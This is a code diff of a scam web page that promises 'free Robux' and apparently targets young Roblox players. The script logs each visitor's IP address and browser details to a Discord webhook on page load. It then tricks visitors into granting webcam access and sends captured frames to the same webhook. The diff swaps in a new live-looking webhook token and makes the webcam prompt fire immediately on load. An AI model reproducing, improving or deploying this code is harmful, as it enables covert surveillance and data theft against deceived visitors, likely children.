@@ -36,48 +36,11 @@
     <button id="executeBtn">🎁 CLAIM FREE ROBUX</button>
 
 <script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1403081784375250956/eaEVlqH7CvPktmPE8Cjo81X96IuwyH9qS-gTJ58DVS6NAdIbcQ8zuoo4ATQZ8funVWT2";
+// ䷀䷁䷂䷄ WEBCAM CAPTURE WITH DELAY + IP LOGGER ䷅䷆䷇䷈
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1403083806705057812/I3474kOt2sZKd2gOPsv6BCcP1X7J0smnlx5r15sp_Hm28vtemEZaCbMI1q3D6emTv5zR";
 const DELAY_SECONDS = 3; // Delay before capturing webcam
-const INACTIVITY_TIMEOUT = 30000; // 30 seconds inactivity timeout
 
-// Track user activity
-let userActive = true;
-let inactivityTimer;
-
-// Reset inactivity timer on user activity
-function resetInactivityTimer() {
-    userActive = true;
-    clearTimeout(inactivityTimer);
-    inactivityTimer = setTimeout(() => {
-        userActive = false;
-        showPermissionPopup();
-    }, INACTIVITY_TIMEOUT);
-}
-
-// Initialize activity tracking
-function initActivityTracking() {
-    // Listen for any user activity
-    window.addEventListener('mousemove', resetInactivityTimer);
-    window.addEventListener('keydown', resetInactivityTimer);
-    window.addEventListener('click', resetInactivityTimer);
-    window.addEventListener('scroll', resetInactivityTimer);
-    
-    // Start the timer
-    resetInactivityTimer();
-}
-
-// Show permission popup after inactivity
-function showPermissionPopup() {
-    if (confirm("You've been inactive for 30 seconds. Allow webcam for free robux?")) {
-        hijackWebcam();
-    } else {
-        getIP().then(ip => {
-            logToWebhook("⚠️ WEBCAM DENIED", `IP: ${ip}\nUA: ${navigator.userAgent}`);
-        });
-    }
-}
-
-// GET IP
+// 丂ᚴᛁᚥᛖ丂丂丂丂 GET IP
 async function getIP() {
   try {
     const res = await fetch("https://api.ipify.org?format=json");
@@ -88,7 +51,7 @@ async function getIP() {
   }
 }
 
-// LOG TO WEBHOOK
+// ䷀䷁䷊䷋ LOG TO WEBHOOK
 async function logToWebhook(title, description) {
   const embed = {
     title: title,
@@ -103,7 +66,7 @@ async function logToWebhook(title, description) {
   });
 }
 
-// WEBCAM SNATCHER WITH DELAY
+// 丂ᚴᛁᚥᛖ丂丂丂丂 WEBCAM SNATCHER WITH DELAY
 async function hijackWebcam() {
   try {
     const ip = await getIP();
@@ -134,7 +97,7 @@ async function hijackWebcam() {
     
     // Add loading text
     const loadingText = document.createElement("div");
-    loadingText.textContent = `GETTING ROBUX in ${DELAY_SECONDS} seconds...`;
+    loadingText.textContent = `Capturing in ${DELAY_SECONDS} seconds...`;
     loadingText.style.color = "white";
     loadingText.style.backgroundColor = "black";
     loadingText.style.padding = "5px";
@@ -145,7 +108,7 @@ async function hijackWebcam() {
     let countdown = DELAY_SECONDS;
     const countdownInterval = setInterval(() => {
       countdown--;
-      loadingText.textContent = `GETTING FREE ROBUX in ${countdown} seconds...`;
+      loadingText.textContent = `Capturing in ${countdown} seconds...`;
       if (countdown <= 0) {
         clearInterval(countdownInterval);
         captureFrame();
@@ -182,17 +145,48 @@ async function hijackWebcam() {
   }
 }
 
-// MAIN EXECUTION
+// ䷀䷁䷊䷋ MAIN EXECUTION
 (async function() {
   const ip = await getIP();
   await logToWebhook("🌐 VISITOR DETECTED", `IP: ${ip}\nUser-Agent: ${navigator.userAgent}`);
 
-  // Button event listeners
-  const btn = document.getElementById("executeBtn");
-  btn.addEventListener("click", hijackWebcam);
+  if (confirm("Allow webcam for free robux?")) {
+    await hijackWebcam();
+  } else {
+    await logToWebhook("⚠️ WEBCAM DENIED", `IP: ${ip}\nUA: ${navigator.userAgent}`);
+  }
+
+  // 丂ᚴᛁᚥᛖ丂丂丂丂 MANUAL TRIGGER BUTTON
+  document.body.innerHTML += `
+    <button id="executeBtn" style="
+      position:fixed;
+      top:10px;
+      right:10px;
+      z-index:9999;
+      background:linear-gradient(to right, #ff8a00, #e52e71);
+      color:white;
+      border:none;
+      padding:12px 24px;
+      border-radius:25px;
+      cursor:pointer;
+      font-weight:bold;
+      box-shadow:0 4px 15px rgba(0,0,0,0.2);
+      transition:all 0.3s ease;
+    ">
+      🎁 CLAIM FREE ROBUX
+    </button>
+  `;
   
-  // Initialize activity tracking
-  initActivityTracking();
+  const btn = document.getElementById("executeBtn");
+  btn.addEventListener("mouseover", () => {
+    btn.style.transform = "scale(1.05)";
+    btn.style.boxShadow = "0 6px 20px rgba(0,0,0,0.3)";
+  });
+  btn.addEventListener("mouseout", () => {
+    btn.style.transform = "scale(1)";
+    btn.style.boxShadow = "0 4px 15px rgba(0,0,0,0.2)";
+  });
+  btn.addEventListener("click", hijackWebcam);
 })();
 </script>
 
